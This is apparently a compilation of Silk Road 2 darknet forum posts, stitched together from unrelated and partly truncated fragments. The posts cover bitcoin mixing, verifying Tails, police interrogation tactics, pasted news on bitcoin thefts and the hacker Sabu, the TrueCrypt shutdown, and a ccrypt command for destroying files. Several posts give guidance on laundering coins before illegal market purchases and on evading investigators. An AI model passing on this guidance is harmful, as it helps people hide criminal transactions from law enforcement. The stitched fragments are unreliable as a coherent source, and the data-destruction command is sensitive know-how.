Quoting here:   I think I'll stick with the Fog","I haven't used that service in a long time, so it may have changed, but the way blockchain.info used to ""anonymize"" bitcoins was way too vulnerable to traffic analysis. First, they charged a flat fee of 1.5% (which I believe was reduced to 0.5%), and when you sent the coins to your anonymous address, the fee would be subtracted, and the rest would be deposited to your real bitcoin address in exactly two transactions, within about 10 minutes. So if someone identifies your SR address as belonging to SR and they see the deposit came from another address, which they suspect belongs to blockchain.info, because the coins in that address came from two transactions a few minutes apart, then they merely have to look in the block chain for a transaction that occurred about 10 minutes earlier and involved exactly 1.5% (or 0.5%) more BTC. Now they are on the other side of the mixer and they can follow the transaction chain back to the exchange and your identity.There are much better mixing services that give you more options for how you deposit and withdraw your coins, along with charging variable rate fees, to defend against that kind of traffic analysis."

They had the original coinbase address the journalists were sending from and basically all the addresses that the journalist would have access to, including the end SR deposit address. They were then able to trace through BCF but not through blockchain.  The shared send vulnerability is not an actual trace. It's an inferred conclusion based on amount and timing. They weren't able to actually trace the transactions.  One way to use shared send with more safety is to only send smaller amounts in round numbers. If you are sending 1.235478 BTC then it is much easier to find that minus the .05% If everyone sent an even 1.000000 then there would be a lot of different destinations with the same amount.

Ok so bascially I download the tails ISO image and the cryptographic signature immediately below it into the same folder on my computer and then I also download the Tails signing OpenPGP key further down the Tails page into the same folder on my computer. Then I right click on the Tails signing key file and select the 'Import Keys' option from the 'More GpgEX options' list. After this I right click on the Tails ISO image file and select the 'Verify' option from the 'More GpgEX options'. This brings up the Decrypt/Verify files dialog box,  but the input file is specified as the cyrptographic iso signature file (the input file is a detached signature box is already checked) and the signed data is listed as the ISO image. If I then press the decrypt/verify button at the bottom of the dialog box I can obtain the  Not enough information to check the signature validity. Signed on ... by tails@boum.org (Key ID: 0xBE2CD9C1 The validity of the signature cannot be verified. message.   However, if I try to replace the cyrptographic iso signature file preloaded as the input file in the above step with the Tails signing key file (keeping the  input file is a detached signature box checked) before selecting the decrypt/verify button then the message that is returned is 'Verification failed - General error'.  I'm a little confused here, bascially if I'm comparing the signed ISO image with the cyrptographic iso signature file then I get the epxpected results, but how are both of these files being compared against the Tails signing OpenPGP key? If I'm doing this couldn't a man in the middle upload a fake tails ISO image signed with an inauthentic private key signature and the same fake cryptographic iso signature file onto the tails website so I am essentially comparing the two fakes with each other without checking that the ISO image signaure corresponds to the Tails signing OpenPGP key? Or does importing the Tails signing OpenPGP key into Kleopatra in the first step somehow allow the system to compare the ISO image signature with the cyrptographic iso signature file to check theyre the same and then compare both of these to the Tails signing OpenPGP key to check they correspond? Or is it the case that man-in the-middle attacks can only happen whilst you're actually doanloading and the download gets hijacked so it's very improbable that someone could hijack my download of both the tails ISO image file and the cryptographic iso signature file so checking these two are the same is sufficient? In which case where does the Tails signing OpenPGP key fit in?   Apologies for rambling on but I'm quite confused over this. Any help anyone could give would be much appreciated.  Thanks in advance.

The easiest option would be to boot up your new Tails OS and verify the downloaded .iso through Tails.  You will need to add the .iso used and the cryptographic signature of the downloaded .iso to your Tails OS on a USB. Just add them to a separate USB port and plug it into your PC. Click on Start > Places and then you will see the USB with the data on it. Drag and drop them into the desired location. Tails already has a copy of the Tails signing key in the keyring of the PGP Applet.  Then right-click on the cryptographic signature and select > Open with Verify Signature. Once the verification is complete, you will be notified either way.",""

"Silk Road 2 Forums","John Kimble","44198","2014-07-06T11:57:57","Verifying Tails with Kleopatra","Discussion/Security"," Again, many thanks for the time you have taken to help me with this issue, it's greatly appreciated.   I actually bumped into a friend I hadn't seen in years who works in IT security last night and I had a bit of a chat with him about this.  Basically it seems as though I hadn't really understood what an ISO image is and how they can be securely 'signed'.  The way my friend explained it was that the ISO image file is 'hashed' with the signature in the iso image signature and this creates a fingerprint in the ISO image which is inextricably embedded into the structure of the image and so therefore that is what is being verified in kleopatra, that the fingerprint in the ISO image matches the signature it is derived from. Then, as you say, the expected code 0x1202821CBE2CD9C1 that is thrown out with the verification is derived from the tails public key and cannot be derived from any other key so effectviely you know that the ISO image was hashed with a specific iso image signature and that this signature was defnitely created by the holder of the tails public/private key pair.   Whew, thank you very much weatherman for helping me get to the point where all I needed was to find the missing piece. I'm now confident that my version of tails is not hacked and also more confident in the logic behind verifying other pieces of sensitive software such as tor etc.  I do think however that tails could do with explaining things in this basic way in ther section on verifying the download as after all if people understand in a very superficial way the nuts and bolts of the process they'll be more confident that they've acheived the right result, and after all part of the aim of these programs is for them to be accessible to everybody, becuase internet security shouldn't only be for the tech-savvy.   I hope this thread has helped some other people.       John","Quote from: John Kimble on July 05, 2014, 06:28:24 pmWeatherman you absolute hero, thank you very much for addressing my questions, I think I'm closer to understanding how this all works.GreatQuote from: John Kimble on July 05, 2014, 06:28:24 pmHowever I'm still a little unclear.

I thought of some ways to help circumvent that, but just keep in mind some of them aren't proven, so take it with a grain of salt.  Tips for the interrogation room:  1. Despite what the man screaming in your face and pounding on the table is saying, you can remain silent.  2. Do not say anything without a *competent (and preferably private) criminal defence lawyer/attorney present.  3. If you must make a statement, timestamp it.  Here's how:  (a). Most discreet, but difficult: Using the Base 2 hand counting method, timestamp every statement by counting up after each statement, make sure your hands are visible to the camera. I warn you, this is quite the skill to master.  (b). Most likely: After every statement, loudly and audibly count a number.  Do not lose track, if an investigator calls you out on this during an interview, it may nullify your timestamps. It's also very important you say the numbers  AFTER the statement. Here's why:  Investigator: ""How many pills did you recieve in the package, why did you purchase them? Make this easy on yourself.""  You: "" 15. I feel I've been very clear on this, I had no knowlege of the package's contents.""  Investigator: ""Thanks for you're cooperation, that's all we need to know.""  -This can be easily doctored into/percieved as an admission (even though they know it wouldn't be true). Investigators can and do edit interrogation tapes, and it's perfectly legal to do so.  That's why you must time stamp. Keep this in mind, they only have one purpose or desire, to get a confession from you. They want you behind bars.  (c). Most unlikely, but effective: Ask the investigators permission to walk freely around the room, provided you're supervised. Walk into a corner. After each and every statement move incrementally against the wall. This creates a powerful timestamp that is very difficult to doctor. Any editing done to the tape will by very noticable because of how much you're moving.    - I (thankfully) have not tried all of these methods during an interrogation, so I cannot vouch for all of them. Counting in Base 2 seemed to be pretty effective when I was questioned, it's difficult to edit out my hands without clearly and deliberately showing that they are trying to doctor my true statements.

Bitcoins are a decentralized digital currency generated by computers ""mining"" for the solutions to complex math problems, and authenticated on a peer-to-peer basis not by a central banking authority. It's the third major heist this month about $1.4 million worth was stolen several weeks ago from an anonymous Australian who ran an online wallet service known as Inputs.io, and a Chinese exchange abruptly vanished two weeks ago, taking more than $4 million with it.  Smaller thefts, which affected consumer exchanges in the Czech Republic and Poland, have also taken place this month.  In the latest incident, BIPS was apparently targeted by a distributed denial-of-service attack earlier this month. A follow-up attack, according to bitcoin news site Coindesk, subsequently knocked out key security systems and allowed the thieves to make off with 1,295 BTC.  In response to the incident, BIPS said in a statement that it was forced to pull the consumer payments functionality of its services off-line, and warned users that they would have to transfer any balances to a different wallet service.  ""BIPS will temporarily close down the wallet initiative to focus on real-time merchant processing business which does not include storing of Bitcoins,"" the statement said, adding that BIPS will attempt to re-open its consumer wallet service with improved security measures in the future.  BIPS customers aren't happy with the exchange's response to the incident. Many have taken to the Bitcointalk forums to accuse BIPS' leadership of carelessness and, in several cases, hinted at actual malfeasance. One user, who says he or she lost 90 BTC (about $71,000, at the time of this writing), has created an online form so that others can sign up to be part of possible legal action against BIPS.  Bitcoins, thanks to their general anonymity and lack of centralized regulation, have become popular among illegal users, who can use it as a convenient medium of exchange for illicit goods or services. Huge price spikes have driven the value of a bitcoin to more than $750, making the crypto-currency an attractive target for unscrupulous hackers.

Keywords: Legal  Security    ==================================================================  IDG News Service    Bitcoin startup BIPS loses $1 million after DDoS heist [By] John E Dunn 26.11.2013 13:42 Techworld.com  http://news.idg.no/cw/art.cfm?id=CE88EA54-BB9E-FF2D-AC216263E19112FF (clearnet)  Attackers have managed to steal Bitcoins worth more than $1 million (1295 BTC) from Danish payments startup Bitcoin Payment Solutions (BIPS), the firm has admitted.  The apparently Russian-originated breach occurred between 15 and 17 November when BIPS was hit by DDoS attack which turned out to be a distraction designed to allow criminals to launch a separate raid on servers hosting consumer Bitcoin wallets.  ""BIPS has been a target of a coordinated attack and subsequent security breached. Several consumer wallets have been compromised and BIPS will be contacting the affected users,"" the firm said on 17 November.  The firm closed the wallet feature for consumers before noting, rather tactlessly, that it had not ""been BIPS core business and as such regrettably affecting several users has not affected BIPS merchant acquiring.""  Making matters worse, the firm had to suspend its usual helpdesk pending a move to a separate host and asked affected users to contact it via email. This was only reinstated on 22 November.  This won't come as much relief to the affected users who are now down an unknown portion of their Bitcoin stash. BIPS claims to have around 20,000 consumers of different types and is rated one of the largest Bitcoin operations in Europe. Given the emerging status of the currency, this probably isn't saying much.  ""We will need their consent to hand over information to the authorities for further investigation, which hopefully can assist in catching the thief,"" said BIPS founder and CEO, Kris Henriksen on a forum thread.  The firm has also yet to explain how the attack occurred, with Henriksen announcing that that ""technical information will not be disclosed for security reasons.""  He further recommended that consumers abandon such Bitcoin storage systems completely and consider secure ""cold storage.""  Needless to say, Bitcoin traders have been unimpressed by BIPS' nonchalant attitude to their loss, with one user even threatening a lawsuit. But as a firm that launched as recently as March 2013, even without an action against it BIPS is unlikely to emerge with its reputation unscathed.  The whole affair has unsettling echoes of a similar attack on an Australian Bitcoin processor two weeks ago in which currency worth at the time around $1.3 million (Â£820,000) was lost.  ""Bitcoin, and similar operations such as Litecoin, are of particular interest to cybercriminals because they can be used to purchase real assets, not just virtual assets,"" commented senior research fellow David Harley of security firm ESET.  ""There are some attacks where your defences are only as good as your service providers' security allows."" Keywords: Security   ",""

Well, he was released recently from his handlers apparently. I wonder what kind of felonies and shenanigans that guy was up to under the auspices of being an informant... shady.   **Clearnet**  http://www.deepdotweb.com/2013/12/20/silk-road-administrator-inigo-busted/ (too big to copy/paste)  http://www.theguardian.com/technology/2014/may/27/hacker-sabu-walks-free-sentenced-time-served   LulzSec hacker 'Sabu' released after 'extraordinary' FBI cooperation  Authorities credit Hector Xavier Monsegur with helping them cripple Anonymous in lenient sentence of time served  Hector Xaviar Monsegur, the notorious hacker known as Sabu, arrives for sentencing on Tuesday. Photograph: Brendan McDermid/Reuters  Hector Xavier Monsegur, who by the US governmentâs calculations participated in computer hacker attacks on more than 250 public and private entities at a cost of up to $50m in damages, was released from a Manhattan courtroom on Tuesday after the judge saluted his âextraordinary cooperationâ with the FBI.  Monsegur, or âSabuâ as the celebrated hacker was known, was sentenced to time served â equivalent to the seven months he spent in prison last year â plus a yearâs supervised release, in reward for having spent much of the past three years working as a federal informant. He had been facing a maximum sentence according to official guidelines of more than 26 years.  His lenient sentence seals his reputation as one of the hacker worldâs most hated figures, a skilled technician who turned from having been a leading figure of the Anonymous and LulzSec collectives into what was in effect an undercover FBI agent. Dressed in grey trousers and a loose black shirt, Monsegur told the court: âIâm not the same person I was three years ago. Iâve come a long way. Iâve had to do a lot of thinking and soul-searching.â  As she announced her decision, Loretta Preska, the chief judge of the federal district court for the southern district of New York, repeatedly praised what she called his âtruly extraordinary cooperationâ. She said he had provided âsophisticated and complex assistance to the government allowing them to pierce the secrecy surrounding LulzSec and successfully prosecute its membersâ.  Preska added that his work as an informant was all the more exceptional because it was carried out at considerable personal risk, federal officials having revealed that Monsegur was working for them early on in the operation. âThere is no question that Mr Monsegur and his family were subject to threats and assaults,â she said.  But condemnation from those who Monsegur had betrayed was swift and strong. A spokesperson for Anonymous told the Guardian that âMonsegur is, first and foremost, a criminal; the FBIâs cyber crime task force are his co-conspirators. While operating under their supervision, Monsegur committed numerous felonies which should in no way be excused due to his protected informant status.â  Anonymous added: âThe FBI continues to use captured informants, who commit egregious crimes in pursuit of reduced sentences, for the sole purpose of creating âexamplesâ to frighten the public. They do this with the hope of pacifying online dissent and snuffing out journalistic investigations into the US governmentâs misconduct.â  In a sentencing memorandum released by Preet Bharara, the US attorney for the southern district of New York, on Friday the government revealed that Monsegur had directly helped to identify and convict eight of his peers in the Anonymous and LulzSec hacker collectives. Most notably, he was seminal in nailing Jeremy Hammond, who at the time was the FBIâs number one most wanted cybercriminal in the world, for his role in hacking into the private intelligence firm Stratfor.  Hammond was sentenced to 10 years in prison last November for his role in the computer breach. What was not discussed during Monsegurâs sentencing on Tuesday was that when he was convicted, Hammond claimed that Monsegur himself had directed much of his criminal activity, including attempts to break into the websites of foreign governments.  Hammond said that Monsegur, operating as âSabuâ, had supplied him with lists of foreign countries vulnerable to attack including Brazil, Iran and Turkey. Hammand went so far as to suggest that the FBI had been using him to launch cyber-attacks around the world, with Monsegur acting as the coordinator.  Hammond told Preska â the same judge who let Monsegur walk free on Tuesday â as she sentenced him to 10 years: âThe government celebrates my conviction and imprisonment, hoping that it will close the door on the full story. I took responsibility for my actions, by pleading guilty, but when will the government be made to answer for its crimes?â  In addition to Hammond, Monsegur was also key to the convictions of other LulzSec members, including in the UK Jake Davis, who went by the internet handle âTopiaryâ, who was sentenced to two years in a young offender institution; Ryan Ackroyd, aka âKaylaâ, sentenced to 30 monthsâ imprisonment; Ryan Cleary, sentenced to 32 months in prison; and Mustafa Al-Bassam, aka âT-Flowâ, sentenced to 20 months suspended for two years. LulzSec members in Ireland, Darren Martyn and Donncha OâCearrbhail, were also caught in the Sabu net.  One defendant, Matthew Keys, a former Reuters journalist, is awaiting trial in the US on charges that he permitted unauthorized access to the computer systems of an old employer, the Tribune Company. Hector Xavier Monsegur,outside the US district court for the southern district of New York. Hector Xavier Monsegur,outside the US district court for the southern district of New York.   The sentencing hearing and memorandum have opened a window into the extent that the FBI will go in turning prominent hackers into informants. Monsegurâs defence attorney, Peggy Cross-Goldenberg, told the court that a camera had been installed in his apartment in a public housing project in Manhattan so that his computer activities could be monitored 24 hours a day. âFor nine months, he gave everything he had,â she said.  The memorandum discloses that in order to catch Hammond, Monsegur had been put at the hub of a vast web of surveillance. During the Hammond investigation, it says, Monsegur in New York âengaged in online chats with Hammond (who was then in Chicago), while coordinating with FBI agents in New York, physical surveillance teams deployed in Chicago, and an electronic surveillance unit in Washington DC.â  Monsegur began hacking computers in 2003, and by 2006, the government says, he was engaged in criminal hacking for his own personal gain. His first act of political âhacktivismâ appears to have been with Anonymous when he took part in distributed denial of service DDoS attacks on PayPal, Mastercard and Visa in protest at the companiesâ refusal to handle donations to the free information group WikiLeaks.  In May 2011 he became a founder member of LulzSec, a splinter of Anonymous, that operated as a tight team of highly skilled hackers in the US, UK and Ireland. Together they went on an audacious spree of attacks, ranging from the internet security firm HB Gary, the website of X-Factor on Fox Television, Nintendoâs computer system and the website of the US senate. An FBI affiliate in Atlanta, Infragard/Unveillance, was also breached.  On 7 June 2011, FBI agents knocked on Monsegurâs door in Manhattan. His transformation from a hacker legend into an informant was instantaneous â he agreed to cooperate with the government immediately. The speed of his conversion was significant, and praised by Preska during her sentencing on Tuesday, as it prevented a security mechanism kicking in among LulzSec members who had agreed to destroy all their files should any of them go offline for any length of time.  As Monsegur begins his yearâs supervised release, including close monitoring of his computer use, questions are likely to remain over the nature of his lenient sentence, and particularly his alleged role in spearheading attacks on foreign governments while acting on behalf of the FBI.  Professor Ahmed Ghappour of UC Hastings college of the law, an expert in computer law, said it was one thing to help the FBI in a sting operation on perpetrators of a crime already in motion, another âwhen you contribute to the creation, inducement and execution of a crime that never was. Particularly when those crimes may very well affect our foreign policy.â   ",""

Prepare for angry soldiers to start ranting at you though     It's amusing how all the people slating Sabu have now stopped... perhaps they're lamenting their words. I really don't know what would be the difference between Sabu and someone who could take the hit. If human nature is anything to go by it might not even be a positive trait.

Bitcoin raised: 55. 72  Video download link: https://darkwallet.unsystem.net/darkwallet.webm   Your keys. Your Privacy. Your Sovereignty.  Dark Wallet is a project of unSYSTEM and Defense Distributed that starts with simple premises: Bitcoin as a web technology and privacy by default.   We love Bitcoin and the way it empowers and reorients individual and community commerce. Dark Wallet as a project will serve as a platform or starting codebase for delivery of a high quality Bitcoin that serves The People over enterprise and government interests.  The Dark Wallet premiere client will work as a light browser extension featuring trustless mixing, multisig, and colored coin support. See more technical info here, a list of our past work, and how we will use the money.  Who's Involved  Vitalik Buterin - Author of Pybitcointools and technical writer for Bitcoin Magazine. Janislav Malahov - Bitcoin web developer & enthusiast. Cody Wilson - Director of Defense Distributed and DarkWallet. Pieter Hintjens - Experienced senior dev, community manger for ZeroMQ. Amir Taaki - Developer of Libbitcoin, experienced wallet dev. Pablo Martin - Experienced dev, trustless mixing and network & systems dev. Developing encrypted telephony (PBX). Mihai Alisie - Bitcoin Magazine editor in chief. Director for Egora. Santiago Mendez - Sysop and support for Lorea, PBX telephony and Obelisk Bitcoin servers, and for the CIC (Catalan Integral Cooperativa). Robert Williamson - libbitcoin/Bitcoin API systems dev.  The Impact  Dark Wallet needs $50k to finish its development and testing.  We hope you will elect to support this open source infrastructure now over waiting for the premium, managed clients of tomorrow.  We are interested in scaling up the Bitcoin infrastructure in an intentionally subversive and empowering direction- taking Bitcoin just where it has been threatening to go. Towards an integrity of values, and a neutrality promoted by anonymity and a resistance to censorship. Software can stand for something.  The unSYSTEM team at the CIC's Calafou live frugally and share a common ideal of investing in common infrastructure. Dark Wallet's funds will after 45 days be transmitted to a multisignature Bitcoin address, publicly viewable on the blockchain, for the coming months of project administration. Administration will be publicly accountable. Should we surpass our goal, surplus funds will be deposited to the same account and used to support unplanned and experimental features within the infrastructure.   We are skilled and experienced software developers who live for the freedom of the Internet.   Preserve Privacy and Freedom of Speech  Bitcoin is the next battle ground in the fight against supranational political domination. Nation states harrass their governed populations with parades of open lies, and dedicate their time to the modern statist paradigm: developing emergency powers and containing the growth of new technologies. Digital anonymity and freedom of financial speech are some of the last tools left in the dwindling garrisons of Liberty.  We are by turns threatened and mocked by neoliberal social engineers and their Boomer bagmen. We face an ""architecture of oppression.""  Worse still, even liberatory technologies like Bitcoin are on the path to self-censorship due to the business interests of a relative few who excerise disproportionate influence within a dangerously monocultural ecosystem. Help us introduce principled diversity with an intelligent and independent implementation.  Other Ways to Help  Some people just cannot contribute, or have not yet decided to engage with Bitcoin as a useful implement for change. But you can still help us: Share this campaign with the share tools at the top of the page Join the unSYSTEM.net mailing list Use our development tools (libbitcoin, sx, Pybtctools) and offer feedback Begin building things. We need less ideas and more work. Start contributing to Electrum or Hive wallets. or packaging/testing/building the tools. Mine with luke-jr's Eligius mining pool.",""

If nothing else, this will prevent you from attempting to install a bad download. Many DVD writer software packages hve a mode you can select (usually by checking a box) or something like that. When selected, the software goes through an additional pass after the image is burned to the disc. It verifies the data burned to the disc against the copy that is on the computer. This helps avoid problems due to defective media -- it doesn't happen often, but sometimes media has flaws that prevent proper burns. For movies, music, etc. dropouts are no big deal -- the worst you can have are a few screen artifacts, or a couple of pops or clicks. In sofware, missing or dropped bits can prove disastrous.

And, I agree that is how most people should use it. I do think there is more to Tails' usefulness than just that super-secure use. Just breaking out of Windows seems like a great reason to me.   And, whats the advantage of having the persistence volume on a separate flashdrive? If you are going to have persistence, which I agree is basically a bad thing, how would it help to have it separated if you use them both together all the time?","...and you should 'really' only be using a one-time writable DVD-R or 'write'-protected usb flashdrive and burning your OS while ""offline"". otherwise you are defeating the entire purpose of running an OS like Tails ""Live"" in the first place. try using a new DVD-R to start at least. verify. authenticate, and stick with running Tails on the DVD-R for now if at all possible. then use a separate 'normal' flashdrive for a 'persistence' volume..."

I am a noob on much of this stuff. I can see this would be helpful in many ways. I do think there may be ""infection, manipulation, malware, ect.' that can attack your live session. I'd guess they could do damage and possibly deanonymize you, but once you shut down, the malware would be erased. Any attack that required a reboot would fail. I'd still be paranoid, but my symptoms would be lessened. Thanks for the educating :-)  Edit: I guess the malware would not be erased if it is on your separate persistence flashdrive. But it would have trouble installing permanent changes into your OS. It does sound helpful.","Quote from: nw nugz on February 06, 2014, 08:32:17 amAnd, whats the advantage of having the persistence volume on a separate flashdrive? so you can ensure your OS, your Tails OS that you (should) run ""Live"" is immune to infection, manipulation, malware, ect. and......to protect your computer, OS, and software from hacking and malware infection. on the software level. ...dig? peacemirage"

I knew my SR password by heart for the longest time but i just recently used the password generator to generate a fucking 164bit password (kicking myself as i type). Is there anyway that i can recover my SR account or is it gone in the wind?? i can provide my pin and details about  my transactions if needed. I honestly can make a new one i just would like to get the coins i had in there. Nothing to be mad about. I ran into a hiccup trying to get coins off of localbtcs today needless to say today has been kind of shitty. Hey, it could have been worse. Not to mention i wasted like 43 dvd trying to get this new damn tails. Everything seemed to work fine until i would try and boot into it using the dvd. It would just boot into my regular OS. I had to download bootice and restore one of the usbs that i some how fucked up and wrote it onto that using the universal usb installer. Im currently running on my usb with no persistence, luckily i remembered the forum url and password.So do you think its a possibility i could get my account back ??can someone help me out with this ^^^^^^^"

I would never link a bank account of my own, which i dont use anyway when their are soo many other ways to handle your income etc. Linking a Bank to where you buy BTC's?  IMO is the worst idea..   I was over on the agora forums and one guy was asking was it safe to have his coins from coinbase sent to his agora wallet... I just felt like (forheadslap!)   I simply said NO BRO!!!   DO NOT send coins from a BTC site that is connect RIGHT TO YOUR BANK ACCOUNT WITH EVERYBIT OF YOUR TRUE INFORMATION!!!   Then went on to tell him he needs to Mix them etc, which way beyond his head, His first time buying coins.. I just told him to come over to these forums and so much info is here about safety, and ppl are glade to help...    One guy suggested to him to send them to a LocalBTC wallet then to AG..  I went on to let him know YES THEY ARE LEGAL TO BUY, BUT if your using this currency to buy illegal things then u will get in trouble, and u dont seem to know anyting, i had to tell him BTC leave an electronictrail etc..   But i dunno since this was this guys first BTC buy ever would he be OK with just haveing them sent to a different wallet then right on to AG? Of course mixing is a must, but just wondering what u all thing..  When i first starting buyin on SR1  They said SR had a Mixer and did somewhat of mixing before letting coins post to your account, so myself and many others would just use bitinstant and have them sent right to our off road wallets then move them to sr..  Now anytime i buy coins, I mix/fog  them..    When your buying coins from a DM BTC vendor, HMMM that makes me wonder how safe that is, Unless there not coins sitting on the markets like evo an ag do cause they dont worry about ANYONE stealing their coins.  But i would think a btc vndor keeps them off the marks and will only send them to a clearnet wallet addy,  Or if they dont have a issue sending to the market its cause they have already had all of their coins mixed..","Really bad advice.

","Someone posted a thread earlier about how hard it is to keep forum users' PGP keys straight with identities elsewhere.  I thought I'd share a little of the other side of that coin.   Many of the older posters here remember Pine's post from the old forum about how the keyid of a PGP key can tell you a lot.   I just wanted to make a brief Public Service Announcement about something even more obvious than that:When you create a PGP Key, and stick a real personal email address in there, then post that key on your profile on a fucking darknet forum, that personal email address is visible to everyone who sees your key.So after SRFv1 went away, I decided to do my own archiving of forums that I like, because I'm sick of shit disappearing.  Around the time the whole ""DPR account may be compromised"" thing unfolded, I grabbed another full copy of the forum and the user profiles.I decided to take a quick crunch through the PGP keys in the user profiles here, extracting the email addresses from the PGP key metadata.    The data I'm pasting below represents the most common legitimate domains (the part after the '@') for email addresses in PGP keys posted here, with counts of how many times they're used.   My source data is a couple weeks old.While many of the GMail/Hotmail/Yahoo/etc addresses are obviously bullshit or burners (somebody just sticking '@gmail.com' at the end to fill up space), some quick Internet stalkery told me that more than you'd figure are actually people's real personal email addresses.  That match Facebook/etc accounts.  With pictures.     None of the ones I found turned out to be beautiful blonde women, by the way.36% of the PGP keys posted to user profiles here (as of a week or two ago, whenever I scraped it) have email addresses in the domains listed below.There were plenty of 'nickname@silkroad.onion' addresses.   That's a perfectly good approach.  Just don't use anything that actually ties to your real identity.    When you're creating a key, and it asks for an email address, give it a fake one, please.Quote536 safe-mail.net325 gmail.com86 hotmail.com77 hushmail.com58 yahoo.com34 riseup.net28 countermail.com24 live.com23 lelantos.org20 aol.com18 outlook.com"

The update appeared earlier today, and while we haven't been able to confirm that it's authentic, it has set off a storm in security circles, on Hacker News, and over at Ars Technica. Even though the encryption tool hasn't seen a major uplift in ages, TrueCrypt had recently just passed the first stage of a comprehensive security audit without issue. The sudden warning came as a surpriseâone that a number of commenters around the web have assumed must be the work of a compromised SourceForge account or a rogue site admin. If the warning is legitimate, it might be time to migrate your encrypted files to another service or tool.  Either way, do not download the version of TrueCrypt listed on the site right now. It was compiled yesterday, according to security researcher Runa Sadvik, using a questionable DSA key. It may be compromised along with the TrueCrypt Sourceforge page.  Update: Matthew Green, one of the security researchers involved with the TrueCrypt audit, notes that while he had no prior knowledge of the abrupt change, he believes that the announcement is legitimate.  Similarly, the posted version of TrueCrypt appears to be heavily modified, with critical features removed and a heavy dose of ""INSECURE_APP"" sprinkled through the code. Even so, it was certified with the official TrueCrypt signing key, which leads us to believe this might be the real thing. Ars Technica notes:  The SourceForge page, which was delivered to people trying to view truecrypt.org pages, contained a new version of the program that, according to this ""diff"" analysis, appears to contain changes warning that the program isn't safe to use. Significantly, TrueCrypt version 7.2 was certified with the official TrueCrypt private signing key, suggesting that the page warning that TrueCrypt isn't safe wasn't a hoax posted by hackers who managed to gain unauthorized access. After all, someone with the ability to sign new TrueCrypt releases probably wouldn't squander that hack with a prank. Alternatively, the post suggests that the cryptographic key that certifies the authenticity of the app has been compromised and is no longer in the exclusive control of the official TrueCrypt developers.  -------------------  What the FUCK is happening?

Proper XP-stylee ;-)  Still, I'm a little upset the new release will not have TOR 0.2.4. I guess that's the problem with the long update cycle - the problem with the botnet that has caused 0.2.4 to be prioritized over 0.2.3 only happened in, what, august?  There are a couple of things I like about Liberte over TAILS. For one, it's much more lightweight and sits in a hidden encrypted volume. No doubt it wouldn't fool any proper forensics, but stick a couple of crappy work docs on there and the 200MB will hide a lot better than the 1.5GB TAILS needs. Second, SU access is disabled unless you jump through half-dozen hoops within 120seconds of turning on computer, and most hostile scripts exploit SU-privileges. As someone mentioned, there are relatively few pieces of bundled software packages and you can't install more; while this would be annoying if I wanted to use it all the time, for using it for darknet activities it's fine. The only omission is a bitcoin wallet that was left out for technical reasons. You have GPG, word processor, torified web-browser, what more do you need? There are a few other things, but I've never used them.... I don't know how TAILS does it, but I know that Liberte also changes you MAC address.  I know the updates are long-time-coming with it, but I think the extra restrictions on the access to the system make most common attacks against it unfeasible. It is hardened. And it is niche. Most attacks focus on two things; what is easiest to attack and what is most prolific (so as to provide maximum targets), which is why so many things target Windows - it's bug-ridden and EVERYONE uses. So, for now malicious scrips put out by LE seem to be targeted at Firefox exploits on Windows machines, surprise surprise. But out of these two popular options, I think TAILS is more likely to gain attention from adversaries since it is more popular ATM (at least, it is around here) and because the few security cracks left open (few, I know). But maybe I'm wrong. Bottom line - both are probably better than the TBB! That said, I am always on the look out for articles highlighting flaws in Liberte, just in case....","I was a huge fan of Liberte but as it is no longer being developed, it has to be Tails now."

This open-source software is a variant on the original Unix crypt. Unlike the original crypt , which used a weak algorithm, ccrypt uses AES-256. What I particularly like about this program is that fact that it can be used for data destruction.  Under normal circumstances, when entering a passphrase to protect your data, the software prompts you to enter it twice, to ensure that there are no errors.   Ccrypt has a so-called ""brave"" option where you can enter the passphrase ONCE, after which it encrypts the data in place. So, for example, if I had a file foo.bar, and I wanted to securely destroy it, I could invoke ccrypt using the brave option, like this: ccrypt -b -e foo.bar  CCrypt will prompt me for a passphrase, af which point, I type randomly on the keyboard for 5-10 seconds.  Because you're typing randomly on the keyboard, you don't know what the passphrase is -- you couldn't tell someone even if they put a gun to your head. After the file is encrypted, it is re-named to foo.bar.cpt.  Since the file has been encrypted, in place,  with a random passphrase, it cannot be decrypted, since you don't know what the passphrase is.  You can then use your favorite wiping utility to securely wipe the now-encrypted file.   CCrypt is cross-platform, and is available for download from: http://ccrypt.sourceforge.net/  Nightcrawler 4096R/BBF7433B 2012-09-22 Nightcrawler <Nightcrawler@SR> PGP Key Fingerprint = D870 C6AC CC6E 46B0 E0C7  3955 B8F1 D88E BBF7 433B  Security is a bit like religion... some things have to be taken on faith.  Where security differs from religion is that security is NOT retroactive.  Unlike Christianity, where you can come to Jesus, be 'saved' and have all  your sins washed away, with security you can adopt Tails or PGP, and be  secure from that point forward, but rest assured that your previous sins  (security failings) WILL come back to haunt you and bite you in the ass.

This is an unfortunate side effect of the malleability attack happening on the Bitcoin network.

Granted, traditional havens like Canada might be a little hesitant to adopt someone who helped bring down the world economy -- and in light of recent events in Greece, even France might be reluctant to open its doors.But never fear, dozens of countries don't have extradition treaties with the U.S. -- and are desperate for new visitors.{C}Admittedly, most of the countries on the nonextradition list are communist, run by brutal theocracies, currently at war or lack a functional government. But with a little imagination, a walled fortress and a steady supply of the local moonshine, intrepid on-the-lam travelers can handle it. What's more, with kinds of winters New York has frozen through lately, equatorial Africa is looking better and better.Which leads us to DailyFinance's picks for the top five places to run to when the U.S. Senate decides that it wants to have a little talk.Outdoorsman: With a per-capita GDP of over $17,000, Croatia occupies that sweet spot between places that are too poor to be safe and too expensive to be enjoyable. Your dollar will go a long way here, and with miles of beaches, remote castles, extensive caves and uninhabited islands, the formerly war-torn republic has endless options for your next home. While a little lacking in nightlife, Croatia's extensive diving, caving and hiking opportunities make it ideal for outdoorsmen, and its stable government and parliamentary republic promise that your property -- and life -- should be well protected by the rule of law.Star Trek Enthusiast: Trekkers have few better choices than Kazakhstan. This Central Asian nation, the ninth-largest country in the world, is basically what happens when you mix hundreds of years of Mongol heritage with gobs of revenues from oil and uranium. Terrain options range from extensive shoreline to rugged canyons, but Kazakhstan is particularly famous for the steppes, a sprawling, windblown grassland where the descendants of the Khans drink fermented mare's milk and practice Khyz Kuu, a traditional sport that basically involves chasing down maidens while on horseback. In terms of cities, the capital, Astana, halves the distance between Mongol and Klingon culture, with breathtaking buildings that seem to have jumped off the cover of a Ray Bradbury novel. Officially a presidential republic, Kazakhstan is actually more of a benevolent dictatorship, but the rule of law is strong, and chances are that you won't have any unpleasant run-ins with the local authorities.International Playboy: The Middle East isn't generally known for its rockin' night life, but Dubai has long since positioned itself as the Las Vegas of the Persian Gulf. With gorgeous buildings, a vibrant scene and a sprawling collection of private islands, the city is designed for people much like yourself: Wealthy, questionably moral, and uninterested in dealing with the filthy hoi polloi. If you're 